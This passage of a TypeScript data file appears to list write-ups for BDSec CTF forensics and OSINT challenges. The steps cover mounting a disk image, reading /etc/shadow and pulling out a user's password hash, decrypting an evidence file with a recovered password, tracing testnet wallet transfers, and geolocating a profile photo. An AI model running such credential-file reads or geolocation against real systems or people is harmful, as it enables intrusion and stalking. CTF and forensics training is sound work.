        code: 'OFFSET=$((1054720*512))  # start of the ext4 partition\nsudo mkdir -p /mnt/fbbl\nsudo mount -o ro,loop,offset=$OFFSET disk.raw /mnt/fbbl\nsudo cat /mnt/fbbl/etc/shadow\ngrep \'^arif.khan:\' /mnt/fbbl/etc/shadow > arif.hash  # yescrypt ($y$...) — left it\nls /mnt/fbbl/home/arif.khan',
        lang: 'bash',
      },
      {
        title: 'Recover the vault password, decrypt the evidence',
        text: 'The sensitive evidence (.confession.enc, the Signal export) used a separate VAULT password, not the OS password. I recovered it from vault.conf plus bash history — hint pattern: F!rst + Bank_Name + #Vault + Year — and decrypted offline with openssl.',
        code: "sudo openssl enc -d -aes-256-cbc -pbkdf2 \\\n  -in /mnt/fbbl/home/arif.khan/.confession.enc \\\n  -pass pass:'F!rstB@ngla#Vault2024'",
        lang: 'bash',
      },
      {
        title: 'Insider vs launderer — follow the money, not the diary',
        text: 'With his account open, everything screamed "Arif Khan": a confession file, his CityTrust personal account (4521-887-2024-001), the vault password. I almost submitted him. But re-reading the brief, it asks for the EXTERNAL attacker/launderer we can claw money back from — Arif is the INSIDE man who turned the key, not the person the money ran to. Lesson learned: the disk is the insider\'s story; the money is a different person\'s story. So I stopped reading his diary and started following coins.',
      },
      {
        title: 'Staging wallet from the recovered mail',
        text: 'The pointer off-box is in the recovered mail. A sent message, wallet.eml, exposes the first address the funds touch — my Sepolia entry point, matching "our target is sepolia".',
        code: '0x09767bf7895565CAfA8203DC5979774749C386C0',
        lang: 'text',
      },
      {
        title: 'Follow the deliberate test transfers',
        text: 'I pulled the staging wallet\'s transaction list and read it in order: a chain of tiny, deliberate "test" transfers (0.05 -> 0.04 ETH — the "few dollars or cents" nudge) daisy-chaining onward. Following each "to" to the next address landed me at a hop wallet.',
        code: 'curl -s "https://api-sepolia.etherscan.io/api?module=account&action=txlist&address=0x09767bf7895565CAfA8203DC5979774749C386C0&sort=asc"\n# hop wallet: 0x30BB4eBe3B89fe4d40A54FDB43dA8B246F07Be1b',
        lang: 'bash',
      },
      {
        title: 'Decode the calldata, find the next place to look',
        text: 'The final hop carried input data that made no sense as a value transfer, so I decoded the calldata hex to ASCII: knightbank.journamind.com. That clicked with the brief\'s talk of a "Digital Support Assistant" used to "finalize pending account actions" at Knight Squad Bank — on-chain, someone left me the address of the next place to look.',
        code: 'python3 -c "print(bytes.fromhex(\'<final_tx_calldata>\').decode(\'ascii\',\'ignore\'))"\n# -> knightbank.journamind.com',
        lang: 'bash',
      },
      {
        title: 'Flagged KYC record, corroborated by the pcap',
        text: 'The assistant completes authorization on recent activity, so I gave it the hop wallet and read the response: a flagged KYC record — Mehedi Rahman, KB-2024-00847, m.rahman.op@protonmail.com, linked wallet 0x30BB...Be1b, last login IP 185.220.101.47. That last-login IP matching the C2 from the packet capture was my confirmation moment: the on-chain launderer and the network activity on the bank workstation are the same actor, proven from two independent sources. Trail: mailbox -> Sepolia staging wallet -> hop wallet -> calldata domain -> KnightBank flagged account.',
        code: 'curl -s https://knightbank.journamind.com/api/chat \\\n  -H \'Content-Type: application/json\' \\\n  -d \'{"message":"0x30BB4eBe3B89fe4d40A54FDB43dA8B246F07Be1b"}\'\n# Account Holder: Mehedi Rahman | Account ID: KB-2024-00847 | Status: FLAGGED\nFLAG: BDSEC{KB-2024-00847_Mehedi_Rahman}',
        lang: 'bash',
      },
    ],
    flag: 'BDSEC{KB-2024-00847_Mehedi_Rahman}',
  },
  {
    slug: 'bdsec-area-mapping',
    name: 'Area Mapping',
    event: BDSec,
    category: 'DFIR / OSINT',
    difficulty: 'Easy',
    flagFormat: 'BDSEC{...}',
    description:
      'From the last steps the attacker is Mehedi Rahman (facebook.com/elektrotransczech). According to his recent post, he is in a restricted area. What is the name of that restricted area? The brief told us to "discover where the attacker is located" — this is the payoff.',
    summary:
      'A locked profile, one public cover photo, and a reverse image search to a restricted zone.',
    skills: ['Reverse image search', 'Geolocation', 'Cover-photo analysis'],
    files: [{ label: 'Benson & Hedges — BDSec CTF writeups.pdf', href: TEAM_PDF }],
    role: 'solver',
    solvedBy: 'Mr L',
    steps: [
      {
        title: 'Use the one public artifact on a locked profile',
        text: 'The profile is locked/private. After chasing a few misdirected "recent check-in" links and getting nowhere, I stepped back and looked at the COVER PHOTO — the only piece of the profile still public. What it shows: a shot taken from inside a gated compound, looking out at an industrial boundary/gate — clearly some controlled-access site, matching the word "restricted".',
      },
      {
        title: 'OCR fails — reverse image search wins',
        text: 'I first tried reading the signboards in the image with OCR, but they were too low-res to pull a clean place name. So I changed tactics and ran a REVERSE IMAGE SEARCH on the whole cover photo (Google Lens). The visual matches identified the site as the Ishwardi Export Processing Zone — the BEPZA (Bangladesh Export Processing Zones Authority) controlled industrial zone at Ishwardi. An EPZ is a genuinely gated, permit-only, restricted area, which fits the question exactly.',
        code: 'FLAG: BDSEC{ISHWARDI_EXPORT_PROCESSING_ZONE}',
        lang: 'text',
      },
    ],
    flag: 'BDSEC{ISHWARDI_EXPORT_PROCESSING_ZONE}',
  },
];

export const difficultyClass = (d: Difficulty) =>
  d === 'Hard'
    ? 'text-red-400 border-red-500/30 bg-red-500/10'
    : d === 'Medium'
      ? 'text-amber-400 border-amber-500/30 bg-amber-500/10'
      : 'text-emerald-400 border-emerald-500/30 bg-emerald-500/10';

export const challengeMap = Object.fromEntries(ctfChallenges.map((c) => [c.slug, c])) as Record<string, Challenge>;
